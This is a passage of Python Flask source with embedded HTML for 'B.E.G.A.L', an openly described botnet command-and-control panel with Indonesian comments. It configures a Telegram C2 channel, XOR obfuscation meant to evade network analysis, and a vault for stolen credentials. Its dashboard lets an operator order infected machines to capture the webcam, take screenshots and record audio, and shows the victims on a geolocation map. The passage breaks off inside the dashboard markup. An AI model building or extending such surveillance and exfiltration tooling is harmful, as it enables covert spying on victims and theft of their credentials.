from flask import Flask, send_file, request, jsonify, session, redirect, url_for
import os
import threading
from datetime import datetime
import io
import requests
import random
import base64
import json
import logging
import yaml

# Non-interactive logging setup
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] [%(levelname)s] %(message)s')

# Memeriksa dan memastikan pustaka-pustaka penting telah terpasang
try:
    import bcrypt
    from flask_socketio import SocketIO, emit, join_room, leave_room
except ImportError:
    import sys
    print("\033[91mGalat: Satu atau lebih pustaka Python penting (bcrypt, Flask-SocketIO) belum terpasang.\033[0m")
    print("Silakan jalankan perintah berikut: \033[92mpip install bcrypt Flask-SocketIO\033[0m")
    sys.exit(1)

# ==================== KONFIGURASI UTAMA ====================
CONFIG_FILE = "config.yaml"

def load_config():
    default_config = {
        "BOT_TOKEN": "",
        "CHAT_ID": "",
        "XOR_KEY": "FLIPPER_SECURE_XOR_KEY_1337",
        "BCRYPT_PASSWORD_HASH": "$2a$12$VZnosb4amZbO1uQ4MniFhuFiqZVEmCF.3p1jXVoiXnG/3oztPLdxe"
    }
    
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                config_data = yaml.safe_load(f)
                if config_data:
                    default_config.update(config_data)
        except Exception as e:
            logging.error(f"Failed to load config from {CONFIG_FILE}: {e}")
            
    else:
        # Create default config file if it doesn't exist
        try:
            with open(CONFIG_FILE, 'w') as f:
                yaml.dump(default_config, f, default_flow_style=False)
        except Exception as e:
             logging.error(f"Failed to create default {CONFIG_FILE}: {e}")
             
    return default_config

config = load_config()

# Sunting parameter Telegram C2 Anda di bawah ini secara aman melalui config.yaml.
BOT_TOKEN = config.get("BOT_TOKEN")
CHAT_ID = str(config.get("CHAT_ID"))

# Kunci simetris XOR rahasia untuk menyamarkan konten data dari analisis jaringan dasar.
XOR_KEY = config.get("XOR_KEY")

# Hash kriptografis Bcrypt untuk kata sandi masuk: flipper
BCRYPT_PASSWORD_HASH = config.get("BCRYPT_PASSWORD_HASH")
# ===========================================================

app = Flask(__name__)
app.secret_key = "FLIPPER_ZERO_SECRET_C2_KEY_9988" # Digunakan untuk mengamankan data sesi login
socketio = SocketIO(app, async_mode='threading', cors_allowed_origins="*")

# ================== STATE MANAJEMEN C2 REAL-TIME ==================
# Status monitoring global untuk bot/addon
BOT_MONITORING_ACTIVE = True
# Antrean perintah per-bot (keyed by UUID)
BOT_COMMAND_QUEUES = {}
# Sesi bot aktif (keyed by UUID)
ACTIVE_SESSIONS = {}
# Mapping dari UUID bot ke SID websocket-nya
BOT_SESSIONS = {}
# Gudang kredensial yang dicuri (keyed by UUID)
CREDENTIAL_VAULT = {}
SESSION_TIMEOUT = 120 # Detik. Bot akan dianggap offline jika tidak ada kabar selama durasi ini.

def get_active_bots():
    """Mengembalikan dictionary bot yang masih aktif."""
    now = datetime.now().timestamp()
    # Filter bot yang masih aktif (terlihat dalam SESSION_TIMEOUT terakhir)
    return {
        uuid: data for uuid, data in ACTIVE_SESSIONS.items()
        if (now - data.get('last_seen', 0)) < SESSION_TIMEOUT
    }

# ================== HTML: HALAMAN MASUK (SECURE LOGIN) ==================
LOGIN_HTML_CONTENT = """<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>B.E.G.A.L</title>
    <!-- Memuat Tailwind CSS untuk penataan dinamis -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Memuat FontAwesome untuk ikon grafis taktis -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <!-- Memuat font LCD retro dan Sans-Serif modern -->
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700;800&family=VT323&display=swap" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: {
                        mono: ['"JetBrains Mono"', 'monospace'],
                        lcd: ['"VT323"', 'monospace'],
                    },
                    colors: {
                        flipper: {
                            orange: '#FF8C00',
                            orangeLight: '#FFB85C',
                            orangeGlow: 'rgba(255, 140, 0, 0.45)',
                            orangeDark: '#B36200',
                        }
                    }
                }
            }
        }
    </script>
    <style>
        @keyframes scanline {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }
        .scanlines {
            position: relative;
            overflow: hidden;
        }
        /* Efek garis pindai CRT retro */
        .scanlines::before {
            content: " ";
            display: block;
            position: absolute;
            top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            z-index: 2;
            background-size: 100% 3px, 6px 100%;
            pointer-events: none;
        }
        .scanline-anim::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 100px;
            background: linear-gradient(0deg, rgba(255, 140, 0, 0.08) 0%, rgba(255,140,0,0) 100%);
            animation: scanline 6s linear infinite;
            z-index: 2;
            pointer-events: none;
        }
    </style>
</head>
<body class="bg-[#080809] text-gray-100 font-mono min-h-screen flex items-center justify-center p-4 relative selection:bg-flipper-orange selection:text-black">
    <!-- Grid Efek Ambient Latar Belakang -->
    <div class="absolute inset-0 bg-[linear-gradient(to_right,#1f1f23_1px,transparent_1px),linear-gradient(to_bottom,#1f1f23_1px,transparent_1px)] bg-[size:4rem_4rem] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_50%,#000_70%,transparent_100%)] opacity-30 pointer-events-none z-0"></div>

    <div class="relative z-10 w-full max-w-[400px] bg-neutral-900 border border-neutral-800 rounded-3xl p-6 shadow-2xl relative overflow-hidden">
        <div class="absolute inset-0 bg-gradient-to-b from-flipper-orange/5 to-transparent pointer-events-none"></div>

        <!-- LAYAR LCD RETRO DENGAN CAHAYA ORANGE (SISTEM OTENTIKASI) -->
        <div class="relative scanlines scanline-anim bg-gradient-to-b from-amber-500 to-flipper-orange border-4 border-neutral-950 rounded-xl p-4 shadow-[inset_0_0_20px_rgba(0,0,0,0.8)] h-[135px] flex flex-col justify-between text-neutral-950 font-lcd select-none mb-6">
            <!-- Header Status LCD -->
            <div class="flex items-center justify-between border-b border-black/30 pb-0.5 text-sm tracking-wider font-bold">
                <span>W3lc0me to :</span>
                <span class="animate-pulse">B.E.G.A.L</span>
            </div>
            
            <!-- Elemen Ikon & Judul LCD -->
            <div class="flex items-center gap-3.5 py-1">
                <div class="w-11 h-11 bg-black/15 rounded-full flex items-center justify-center text-2xl border border-black/10">
                    <i class="fa-solid fa-key"></i>
                </div>
                <div class="leading-none">
                    <h2 class="text-xl font-extrabold tracking-wider">AUTHENTICATION</h2>
                    <p class="text-xs text-black/75 mt-1 font-mono uppercase font-bold tracking-tight">ENTER ADMINISTRATIVE KEYS</p>
                </div>
            </div>
            
            <!-- Footer Status LCD -->
            <div class="text-[11px] text-black/70 tracking-widest flex justify-between font-bold uppercase">
                <span>Backdoor Exfiltration Gateway for Advanced Looting</span>
                <span>V.2</span>
            </div>
        </div>

        <!-- Formulir Input Kredensial -->
        <form id="loginForm" onsubmit="handleLogin(event)" class="space-y-4">
            <div>
                <label class="block text-[10px] text-neutral-400 uppercase font-black mb-1.5 tracking-wider">Username</label>
                <input type="text" id="username" placeholder="Enter username" required class="w-full bg-neutral-950 border border-neutral-800 focus:border-flipper-orange text-sm text-neutral-200 rounded-xl px-4 py-3 outline-none font-mono transition-colors">
            </div>

            <div>
                <label class="block text-[10px] text-neutral-400 uppercase font-black mb-1.5 tracking-wider">Password</label>
                <input type="password" id="password" placeholder="••••••••" required class="w-full bg-neutral-950 border border-neutral-800 focus:border-flipper-orange text-sm text-neutral-200 rounded-xl px-4 py-3 outline-none font-mono transition-colors">
            </div>

            <!-- Bagian Verifikasi Captcha Dinamis -->
            <div class="space-y-3">
                <label class="block text-[10px] text-neutral-400 uppercase font-black tracking-wider">CAPTCHA Verification</label>
                
                <!-- Baris Atas: Gambar Captcha & Tombol Refresh -->
                <div class="flex items-center justify-center gap-3">
                    <!-- Wadah Gambar Captcha -->
                    <div class="bg-neutral-950 border border-neutral-800 p-1.5 rounded-xl h-[52px] w-[130px] flex items-center justify-center shrink-0">
                        <img id="captcha_img" src="/api/v1/captcha" alt="Captcha" class="h-full w-full object-contain rounded-lg">
                    </div>
                    <!-- Tombol Muat Ulang Captcha -->
                    <button type="button" onclick="refreshCaptcha()" class="w-12 h-[52px] bg-neutral-950 border border-neutral-800 hover:border-flipper-orange text-neutral-400 hover:text-flipper-orange transition-all rounded-xl flex items-center justify-center shrink-0 btn-active">
                        <i class="fa-solid fa-arrows-rotate text-lg"></i>
                    </button>
                </div>

                <!-- Baris Bawah: Input Captcha Full Width -->
                <input type="text" id="captcha" placeholder="Enter Code Above" maxlength="5" required class="w-full bg-neutral-950 border border-neutral-800 focus:border-flipper-orange text-lg text-center font-extrabold uppercase tracking-widest text-flipper-orange rounded-xl h-[52px] outline-none font-mono transition-all">
            </div>

            <button type="submit" class="w-full mt-6 bg-flipper-orange hover:bg-flipper-orangeLight text-black font-extrabold py-3.5 rounded-xl text-xs uppercase tracking-widest transition-all duration-300 flex items-center justify-center gap-2 btn-active shadow-[0_4px_20px_rgba(255,140,0,0.25)]">
                <i class="fa-solid fa-lock text-sm"></i> Access Terminal
            </button>
        </form>
    </div>

    <!-- Modal Peringatan Sistem -->
    <div id="modal-backdrop" class="fixed inset-0 bg-black/80 backdrop-blur-sm hidden z-50 flex items-center justify-center p-4">
        <div class="bg-neutral-950 border border-neutral-800 rounded-3xl p-6 max-w-sm w-full shadow-2xl relative overflow-hidden text-center">
            <div class="absolute inset-0 bg-gradient-to-b from-flipper-orange/5 to-transparent pointer-events-none"></div>
            <div id="modal-icon-container" class="w-14 h-14 bg-neutral-900 rounded-full flex items-center justify-center mx-auto mb-4 border border-neutral-800 text-flipper-orange text-xl">
                <i class="fa-solid fa-circle-info"></i>
            </div>
            <h3 id="modal-title" class="text-lg font-bold text-white tracking-wider mb-2">SYSTEM NOTIFICATION</h3>
            <p id="modal-body" class="text-xs text-neutral-400 mb-6 leading-relaxed">System settings updated.</p>
            <button onclick="closeModal()" class="w-full bg-neutral-900 hover:bg-neutral-800 border border-neutral-800 hover:border-flipper-orange text-flipper-orange font-extrabold py-2.5 rounded-xl text-xs uppercase tracking-wider transition-all btn-active">
                Acknowledge
            </button>
        </div>
    </div>

    <!-- LOGIKA FEEDBACK AUDIO WEB SYNTHESIZER -->
    <script>
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        function playBeep(freq = 800, duration = 80, type = 'sine') {
            try {
                if (audioCtx.state === 'suspended') { audioCtx.resume(); }
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.type = type;
                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
                gain.gain.setValueAtTime(0.04, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration/1000);
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start();
                osc.stop(audioCtx.currentTime + duration/1000);
            } catch(e) {}
        }

        function showModal(title, body, iconClass = "fa-circle-info") {
            document.getElementById('modal-title').textContent = title;
            document.getElementById('modal-body').textContent = body;
            document.getElementById('modal-icon-container').innerHTML = `<i class="fa-solid ${iconClass}"></i>`;
            document.getElementById('modal-backdrop').classList.remove('hidden');
        }

        function closeModal() {
            playBeep(700, 60);
            document.getElementById('modal-backdrop').classList.add('hidden');
        }

        function refreshCaptcha() {
            playBeep(600, 40);
            document.getElementById('captcha_img').src = '/api/v1/captcha?t=' + Date.now();
            document.getElementById('captcha').value = '';
        }

        async function handleLogin(e) {
            e.preventDefault();
            playBeep(1000, 100);

            const user = document.getElementById('username').value.trim();
            const pass = document.getElementById('password').value;
            const cap = document.getElementById('captcha').value.trim();

            try {
                const response = await fetch('/api/v1/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: user, password: pass, captcha: cap })
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    playBeep(1200, 200, 'triangle');
                    window.location.reload(); // Segarkan halaman untuk memuat dashboard utama
                } else {
                    playBeep(150, 400, 'square');
                    showModal("ACCESS DENIED", result.description, "fa-solid fa-shield-halved text-red-500");
                    refreshCaptcha();
                }
            } catch (err) {
                showModal("SYSTEM ERROR", "Gagal berkomunikasi dengan sistem penampung autentikasi.", "fa-solid fa-triangle-exclamation text-red-500");
                refreshCaptcha();
            }
        }
    </script>
</body>
</html>"""

# ================== HTML: PANEL KENDALIAN UTAMA (DASHBOARD) ==================
HTML_CONTENT = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>B.E.G.A.L - C2 v2.0</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- FontAwesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <!-- Google Fonts: VT323 & JetBrains Mono -->
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700;800&family=VT323&display=swap" rel="stylesheet">
    <!-- LeafletJS for Geo-Map -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin=""/>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
    
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: {
                        mono: ['"JetBrains Mono"', 'monospace'],
                        lcd: ['"VT323"', 'monospace'],
                    },
                    colors: {
                        flipper: {
                            orange: '#FF8C00',
                            orangeLight: '#FFB85C',
                            orangeGlow: 'rgba(255, 140, 0, 0.45)',
                            orangeDark: '#B36200',
                            grayDark: '#121214',
                            grayLight: '#232329',
                            greenGlow: 'rgba(34, 197, 94, 0.35)',
                        }
                    }
                }
            }
        }
    </script>
    
    <style>
        @keyframes scanline { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
        @keyframes flicker { 0% { opacity: 0.98; } 50% { opacity: 1; } 100% { opacity: 0.99; } }
        @keyframes pulseBorder { 0%, 100% { border-color: rgba(255, 140, 0, 0.4); } 50% { border-color: rgba(255, 140, 0, 0.9); } }
        .scanlines { position: relative; overflow: hidden; }
        .scanlines::before { content: " "; display: block; position: absolute; top: 0; left: 0; bottom: 0; right: 0; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06)); z-index: 2; background-size: 100% 3px, 6px 100%; pointer-events: none; }
        .scanline-anim::after { content: ''; position: absolute; width: 100%; height: 100px; background: linear-gradient(0deg, rgba(255, 140, 0, 0.08) 0%, rgba(255,140,0,0) 100%); animation: scanline 6s linear infinite; z-index: 2; pointer-events: none; }
        .custom-scrollbar::-webkit-scrollbar { width: 6px; height: 6px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.2); }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #FF8C00; border-radius: 4px; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #FFB85C; }
        .btn-active:active { transform: scale(0.96); }
        /* Leaflet Dark Theme */
        .leaflet-container { background: #1a1a1b; }
        .leaflet-control-zoom-in, .leaflet-control-zoom-out { background-color: #2a2a2e !important; color: #f0f0f0 !important; border-color: #444 !important; }
        .leaflet-control-zoom-in:hover, .leaflet-control-zoom-out:hover { background-color: #3a3a3e !important; }
        .leaflet-control-attribution { background: rgba(0,0,0,0.7) !important; color: #bbb !important; }
        .leaflet-popup-content-wrapper, .leaflet-popup-tip { background: #2a2a2e !important; color: #f0f0f0 !important; }
    </style>
</head>
<body class="bg-[#080809] text-gray-100 font-mono min-h-screen relative overflow-x-hidden flex flex-col justify-between selection:bg-flipper-orange selection:text-black">
    <!-- Ambient Grid Background -->
    <div class="absolute inset-0 bg-[linear-gradient(to_right,#1f1f23_1px,transparent_1px),linear-gradient(to_bottom,#1f1f23_1px,transparent_1px)] bg-[size:4rem_4rem] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_50%,#000_70%,transparent_100%)] opacity-30 pointer-events-none z-0"></div>

    <div class="relative z-10 w-full max-w-7xl mx-auto px-4 py-6 md:py-10 flex-grow flex flex-col justify-between">
        
        <!-- HEADER BAR -->
        <header class="flex flex-col md:flex-row items-center justify-between border-b border-zinc-800 pb-6 mb-8 gap-4">
            <div class="flex items-center gap-5 w-full md:w-auto">
                <div class="relative group">
                    <div class="absolute -inset-1 bg-gradient-to-r from-flipper-orange to-red-600 rounded-lg blur opacity-70 group-hover:opacity-100 transition duration-1000 group-hover:duration-200"></div>
                    <div class="relative w-14 h-14 bg-flipper-orange text-black flex flex-col items-center justify-center font-black rounded-lg border-2 border-black shadow-inner">
                        <span class="text-xs leading-none tracking-tighter">FLIP</span>
                        <span class="text-xl leading-none font-extrabold">0</span>
                    </div>
                </div>
                <div>
                    <div class="flex items-center gap-2">
                        <h1 class="text-2xl md:text-3xl font-extrabold tracking-wider bg-clip-text text-transparent bg-gradient-to-r from-white via-neutral-200 to-flipper-orange">
                            B.E.G.A.L
                        </h1>
                        <span class="px-2 py-0.5 text-[10px] uppercase tracking-widest bg-red-950 text-red-500 border border-red-800 rounded font-bold animate-pulse">C2 v2.0</span>
                    </div>
                    <p class="text-neutral-400 text-xs mt-1 font-semibold flex items-center gap-2">
                        <span id="socket-status-indicator" class="inline-block w-2 h-2 rounded-full bg-yellow-500"></span>
                        <span id="socket-status-text">CONNECTING TO C2...</span>
                    </p>
                </div>
            </div>
            
            <div class="flex items-center gap-4 w-full md:w-auto justify-between md:justify-end border-t md:border-t-0 border-neutral-800 pt-4 md:pt-0">
                 <div class="text-left md:text-right">
                    <div class="text-xs text-neutral-500 uppercase tracking-widest">Target Connection</div>
                    <div class="text-sm font-bold text-emerald-400 flex items-center gap-1.5 justify-start md:justify-end">
                        <span class="w-1.5 h-1.5 bg-emerald-400 rounded-full animate-pulse"></span>
                        <span id="status">REAL-TIME C2 TUNNEL ACTIVE</span>
                    </div>
                </div>
                <div class="h-10 w-[1px] bg-neutral-800 hidden md:block"></div>
                <div class="text-right flex items-center gap-3">
                    <a href="/report" class="px-3 py-2 bg-neutral-900 border border-neutral-800 hover:border-flipper-orange/50 text-neutral-400 hover:text-flipper-orange rounded-xl text-xs font-bold tracking-wider transition-all flex items-center gap-1.5 btn-active shadow-md">
                        <i class="fa-solid fa-bookmark"></i> REPORT
                    </a>
                    <a href="/logout" onclick="playBeep(400, 150)" class="px-3 py-2 bg-neutral-900 border border-neutral-800 hover:border-red-500/50 text-neutral-400 hover:text-red-500 rounded-xl text-xs font-bold tracking-wider transition-all flex items-center gap-1.5 btn-active shadow-md">
                        <i class="fa-solid fa-right-from-bracket"></i> LOGOUT
                    </a>
                </div>
            </div>
        </header>

        <!-- MAIN HARDWARE & DIAGNOSTICS LAYOUT -->
        <main class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start flex-grow">
            
            <!-- LEFT COLUMN: VIRTUAL FLIPPER ZERO MODULE -->
            <section class="lg:col-span-5 flex flex-col gap-6">
                
                <!-- Physical Device Body Frame -->
                <div class="bg-neutral-900 border border-neutral-800 rounded-3xl p-6 shadow-2xl relative overflow-hidden group">
                    <div class="absolute inset-0 bg-gradient-to-b from-neutral-800/10 to-transparent pointer-events-none"></div>
                    
                    <div class="flex items-center justify-between mb-4 border-b border-neutral-800 pb-3">
                        <span class="text-xs font-bold text-neutral-400 uppercase tracking-widest flex items-center gap-2">
                            <i class="fa-solid fa-gamepad text-flipper-orange"></i> Virtual Hardware Unit
                        </span>
                        <div class="flex items-center gap-1.5">
                            <span class="text-[10px] text-neutral-500 font-bold uppercase">Battery</span>
                            <div class="w-6 h-3 border border-neutral-600 rounded p-[1px] flex items-center">
                                <div class="h-full w-4/5 bg-emerald-500 rounded-[1px]"></div>
                            </div>
                        </div>
                    </div>

                    <!-- RETRO ORANGE-BACKLIT LCD SCREEN -->
                    <div class="relative scanlines scanline-anim bg-gradient-to-b from-amber-500 to-flipper-orange border-4 border-neutral-950 rounded-xl p-4 shadow-[inset_0_0_20px_rgba(0,0,0,0.8)] h-52 flex flex-col justify-between text-neutral-950 font-lcd select-none">
                        
                        <div class="flex items-center justify-between border-b border-black/30 pb-1 text-sm tracking-wider">
                            <span>Exfil Terminal v2.0</span>
                            <span id="screen-timer" class="font-mono text-xs font-semibold">00:00:00</span>
                        </div>

                        <div class="flex-grow flex items-center gap-4 py-2 overflow-hidden">
                            <div id="dolphin-container" class="w-20 h-20 bg-black/5 border border-black/10 rounded flex items-center justify-center relative">
                                <div id="dolphin-idle" class="flex flex-col items-center">
                                    <svg class="w-16 h-16 text-black" fill="currentColor" viewBox="0 0 64 64"><path d="M40 8c-6 0-14 4-18 8-2 2-6 2-10 0-4-2-8 0-10 4s0 10 4 12c4 2 8 0 10-4s6-4 10-2c8 4 18 2 24-4s4-12 0-14zm-4 8a2 2 0 110-4 2 2 0 010 4z" /><rect x="26" y="24" width="22" height="6" rx="2" /><polygon points="28,30 32,38 36,30" /></svg>
                                    <span class="text-[11px] leading-none mt-1 uppercase font-bold tracking-widest text-center">IDLE</span>
                                </div>
                                <div id="dolphin-hacking" class="hidden flex flex-col items-center animate-bounce">
                                    <svg class="w-16 h-16 text-black" fill="currentColor" viewBox="0 0 64 64"><path d="M40 8c-6 0-14 4-18 8-2 2-6 2-10 0-4-2-8 0-10 4s0 10 4 12c4 2 8 0 10-4s6-4 10-2c8 4 18 2 24-4s4-12 0-14zM24 20h8v2h-8zm16-4a2 2 0 110-4 2 2 0 010 4z" /><rect x="18" y="28" width="30" height="8" rx="2" class="animate-pulse" /></svg>
                                    <span class="text-[11px] leading-none mt-1 uppercase font-black tracking-widest text-red-700 animate-pulse">EXFIL</span>
                                </div>
                                <div id="dolphin-success" class="hidden flex flex-col items-center">
                                    <svg class="w-16 h-16 text-emerald-900" fill="currentColor" viewBox="0 0 64 64"><path d="M40 8c-6 0-14 4-18 8-2 2-6 2-10 0-4-2-8 0-10 4s0 10 4 12c4 2 8 0 10-4s6-4 10-2c8 4 18 2 24-4s4-12 0-14zm-4 8a2 2 0 110-4 2 2 0 010 4z" /><rect x="20" y="4" width="24" height="4" fill="black" /><path d="M12 28l12-12h8l12 12z" /></svg>
                                    <span class="text-[11px] leading-none mt-1 uppercase font-black tracking-widest text-green-950">SUCCESS!</span>
                                </div>
                            </div>
                            
                            <div class="flex-grow flex flex-col justify-center text-left leading-none">
                                <div id="screen-title" class="text-xl font-bold uppercase tracking-wider mb-1 truncate max-w-[170px]">SYSTEM READY</div>
                                <div id="screen-sub" class="text-xs tracking-tight text-black/70 mb-2 truncate max-w-[170px]">Select exfil files</div>
                                
                                <div class="grid grid-cols-2 gap-1 text-[11px] font-bold border-t border-black/20 pt-1.5">
                                    <div>STATUS: <span id="screen-status" class="text-neutral-900">READY</span></div>
                                    <div>QUEUE: <span id="screen-count" class="text-neutral-900">0</span></div>
                                    <div>C2: <span class="text-green-900 font-black">ONLINE</span></div>
                                    <div>ENCRYPT: <span class="text-neutral-900">XOR+B64</span></div>
                                </div>
                            </div>
                        </div>

                        <div class="flex items-center justify-between text-[11px] border-t border-black/20 pt-0.5 uppercase tracking-widest font-bold">
                            <span id="screen-mode-desc">MENU: 1. Dashboard</span>
                            <span class="animate-pulse">● REC</span>
                        </div>
                    </div>

                    <!-- Flipper D-Pad Controls -->
                    <div class="mt-6 flex items-center justify-between bg-neutral-950 rounded-2xl p-4 border border-neutral-800">
                        <div class="relative w-28 h-28 bg-neutral-900 rounded-full flex items-center justify-center border border-neutral-700 shadow-inner select-none">
                            <button onclick="navScreen('UP')" class="absolute top-1 w-8 h-8 bg-neutral-800 active:bg-neutral-700 hover:bg-neutral-800 rounded-lg text-neutral-400 flex items-center justify-center border border-neutral-700 btn-active shadow-md"><i class="fa-solid fa-caret-up"></i></button>
                            <button onclick="navScreen('DOWN')" class="absolute bottom-1 w-8 h-8 bg-neutral-800 active:bg-neutral-700 hover:bg-neutral-800 rounded-lg text-neutral-400 flex items-center justify-center border border-neutral-700 btn-active shadow-md"><i class="fa-solid fa-caret-down"></i></button>
                            <button onclick="navScreen('LEFT')" class="absolute left-1 w-8 h-8 bg-neutral-800 active:bg-neutral-700 hover:bg-neutral-800 rounded-lg text-neutral-400 flex items-center justify-center border border-neutral-700 btn-active shadow-md"><i class="fa-solid fa-caret-left"></i></button>
                            <button onclick="navScreen('RIGHT')" class="absolute right-1 w-8 h-8 bg-neutral-800 active:bg-neutral-700 hover:bg-neutral-800 rounded-lg text-neutral-400 flex items-center justify-center border border-neutral-700 btn-active shadow-md"><i class="fa-solid fa-caret-right"></i></button>
                            <button onclick="navScreen('OK')" class="w-10 h-10 rounded-full bg-flipper-orange hover:bg-flipper-orangeLight active:bg-flipper-orangeDark text-black font-extrabold flex items-center justify-center shadow-lg transition-transform btn-active">OK</button>
                        </div>
                        <div class="flex flex-col gap-3 justify-center">
                            <button onclick="navScreen('BACK')" class="w-16 py-2 rounded-xl bg-neutral-850 border border-neutral-700 text-neutral-400 hover:text-white font-bold text-xs uppercase tracking-wider transition-colors btn-active shadow-md"><i class="fa-solid fa-arrow-rotate-left mr-1"></i> Back</button>
                            <div class="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-neutral-900 border border-neutral-800">
                                <span class="text-[9px] uppercase font-bold text-neutral-500">LED</span>
                                <div id="hardware-led" class="w-3.5 h-3.5 rounded-full bg-orange-500 shadow-[0_0_8px_#ff8c00] transition-colors duration-300"></div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- BOT CONTROL MODULE -->
                <div class="bg-neutral-900/80 border border-neutral-800 rounded-xl overflow-hidden mt-4">
                    <button onclick="toggleBotStatus()" class="w-full px-5 py-3.5 flex items-center justify-between text-left hover:bg-neutral-850/40 transition-colors btn-active">
                        <span class="text-xs font-bold text-neutral-400 tracking-wider uppercase flex items-center gap-2">
                            <i id="bot-status-btn-icon" class="fa-solid fa-play text-emerald-500"></i> <span id="bot-status-btn-text">BOT MONITORING: ACTIVE</span>
                        </span>
                        <i class="fa-solid fa-power-off text-neutral-500"></i>
                    </button>
                </div>

                <!-- ACTIVE SESSIONS (BOTS) MODULE -->
                <div class="bg-neutral-900/80 border border-neutral-800 rounded-xl mt-4">
                    <div class="w-full px-5 py-3.5 flex items-center justify-between text-left border-b border-neutral-800">
                        <span class="text-xs font-bold text-neutral-400 tracking-wider uppercase flex items-center gap-2">
                            <i class="fa-solid fa-satellite-dish text-flipper-orange animate-pulse"></i>
                            Active Bots (<span id="bot-count">0</span>)
                        </span>
                        <i class="fa-solid fa-sync text-neutral-500" id="session-refresh-icon"></i>
                    </div>
                    <div id="session-list" class="p-4 space-y-3 max-h-48 overflow-y-auto custom-scrollbar">
                        <div class="text-center text-xs text-neutral-500 py-4">Awaiting bot connections...</div>
                    </div>
                </div>

                 <!-- TARGETED COMMANDS MODULE -->
                <div class="bg-neutral-900/80 border border-neutral-800 rounded-xl overflow-hidden mt-6">
                     <div class="w-full px-5 py-3.5 flex items-center justify-between text-left border-b border-neutral-800">
                        <span class="text-xs font-bold text-neutral-400 tracking-wider uppercase flex items-center gap-2">
                            <i class="fa-solid fa-bullseye text-flipper-orange"></i> Targeted Commands
                        </span>
                        <span id="selected-bot-uuid" class="text-[10px] text-neutral-500 font-mono">NO TARGET SELECTED</span>
                    </div>
                    <button onclick="sendCommandToBot('CAPTURE_WEBCAM')" class="w-full px-5 py-3 flex items-center justify-between text-left hover:bg-neutral-850/40 transition-colors btn-active border-t border-neutral-800/0">
                        <span class="text-xs font-bold text-neutral-400 tracking-wider uppercase flex items-center gap-2"><i class="fa-solid fa-camera text-flipper-orange"></i> Trigger Webcam</span><i class="fa-solid fa-crosshairs text-neutral-500"></i>
                    </button>
                    <button onclick="sendCommandToBot('TAKE_SCREENSHOT')" class="w-full px-5 py-3 flex items-center justify-between text-left hover:bg-neutral-850/40 transition-colors btn-active border-t border-neutral-800">
                        <span class="text-xs font-bold text-neutral-400 tracking-wider uppercase flex items-center gap-2"><i class="fa-solid fa-desktop text-flipper-orange"></i> Trigger Screenshot</span><i class="fa-solid fa-camera text-neutral-500"></i>
                    </button>
                    <button onclick="sendCommandToBot('RECORD_AUDIO', {duration: 30000})" class="w-full px-5 py-3 flex items-center justify-between text-left hover:bg-neutral-850/40 transition-colors btn-active border-t border-neutral-800">
                        <span class="text-xs font-bold text-neutral-400 tracking-wider uppercase flex items-center gap-2"><i class="fa-solid fa-microphone text-flipper-orange"></i> Trigger Mic (30s)</span><i class="fa-solid fa-waveform text-neutral-500"></i>
                    </button>
                </div>


            </section>

            <!-- RIGHT COLUMN: MASTER DRAG & DROP & GEO-MAP -->
            <section class="lg:col-span-7 flex flex-col gap-6">
                
                <!-- GEO-LOCATION MAP -->
                <div class="bg-neutral-900 border border-neutral-800 rounded-3xl p-6 md:p-8 shadow-2xl relative">
                    <h2 class="text-xl font-bold tracking-wider text-neutral-100 flex items-center gap-2.5 mb-4">
                        <i class="fa-solid fa-map-location-dot text-flipper-orange"></i> Bot Geolocation Map
                    </h2>
                    <div id="map" class="h-64 rounded-xl border-2 border-neutral-800"></div>
                </div>

                <!-- CREDENTIAL VAULT & INTERACTIVE TERMINAL -->
